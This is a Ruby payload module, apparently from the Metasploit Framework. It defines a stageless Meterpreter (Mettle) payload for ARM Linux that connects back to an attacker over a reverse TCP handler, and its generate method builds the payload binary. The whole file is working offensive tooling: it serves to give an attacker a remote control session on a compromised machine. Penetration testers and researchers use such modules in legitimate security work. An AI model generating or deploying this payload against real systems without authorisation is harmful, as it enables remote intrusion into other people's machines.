##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_options'
require 'msf/base/sessions/mettle_config'
require 'msf/base/sessions/meterpreter_armle_linux'

module MetasploitModule

  CachedSize = 641064

  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Linux Meterpreter, Reverse TCP Inline',
        'Description'   => 'Run the Meterpreter / Mettle server payload (stageless)',
        'Author'        => [
          'Adam Cammack <adam_cammack[at]rapid7.com>',
          'Brent Cook <brent_cook[at]rapid7.com>'
        ],
        'Platform'      => 'linux',
        'Arch'          => ARCH_ARMLE,
        'License'       => MSF_LICENSE,
        'Handler'       => Msf::Handler::ReverseTcp,
        'Session'       => Msf::Sessions::Meterpreter_armle_Linux
      )
    )
  end

  def generate
    opts = {scheme: 'tcp'}
    MetasploitPayloads::Mettle.new('armv5l-linux-musleabi', generate_config(opts)).to_binary :exec
  end
end